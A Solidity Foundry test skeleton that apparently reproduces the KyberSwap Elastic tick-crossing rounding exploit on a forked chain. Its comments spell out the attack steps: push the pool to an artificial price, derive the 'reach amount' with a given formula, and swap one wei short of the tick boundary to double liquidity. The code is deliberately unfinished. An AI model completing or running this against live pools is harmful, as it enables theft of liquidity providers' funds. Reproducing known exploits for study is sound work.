// SPDX-License-Identifier: MIT
pragma solidity ^0.8.19;

import "forge-std/Test.sol";

// Minimal interfaces for the KyberSwap Elastic pool.
interface IKyberPool {
    struct PoolState { uint160 sqrtP; int24 currentTick; int24 nearestCurrentTick; uint128 currentLiquidity; }
    struct SwapData  { int256 swapQty; bool isToken0; uint160 limitSqrtP; }
    function swap(address recipient, SwapData calldata data, bytes calldata callbackData)
        external returns (int256, int256);
    function getPoolState() external view returns (PoolState memory);
}

/// @notice Skeleton, not a finished PoC. Step 2/3 are what you must derive yourself.
contract TickCrossRoundingPoC is Test {
    IKyberPool constant POOL = IKyberPool(address(0)); // <-- pool from the target block
    address constant ATTACKER = address(0xA11CE);

    function setUp() public {
        vm.createSelectFork(vm.envString("RPC"), /* BLOCK */ 0);
    }

    function test_tickCrossRounding() public {
        // [1] snapshot so a failed attempt does not poison later ones
        uint256 snap = vm.snapshot();

        IKyberPool.PoolState memory s = POOL.getPoolState();

        // [2] push the pool into the state the exploit requires:
        //     no LP liquidity at the artificial price, attacker owns the only position.
        //     _drainToPrice(targetSqrtP);

        // [3] DERIVE the reach amount from state -- never hardcode it.
        //     v131 = (200000*L*(t-sqrtP)*sqrtP) / (200000*t - feeUnits*sqrtP) / 2**96
        //     uint256 reach = calcReachAmount(s.currentLiquidity, s.sqrtP, targetSqrtP, FEE_UNITS);

        // [4] one wei short of the boundary: this is the whole exploit.
        //     POOL.swap(ATTACKER, IKyberPool.SwapData(int256(reach - 1), true, MAX_SQRT_RATIO - 1), "");

        // [5] the invariant that must break:
        //     if price went past the tick, liquidity MUST have changed.
        //     If it did not, updateLiquidityAndCrossTick never ran => the doubling bug.
        // assertGt(POOL.getPoolState().sqrtP, targetSqrtP, "did not cross");
        // assertEq(POOL.getPoolState().currentLiquidity, s.currentLiquidity, "BUG reproduced");

        vm.revertTo(snap);
    }
}
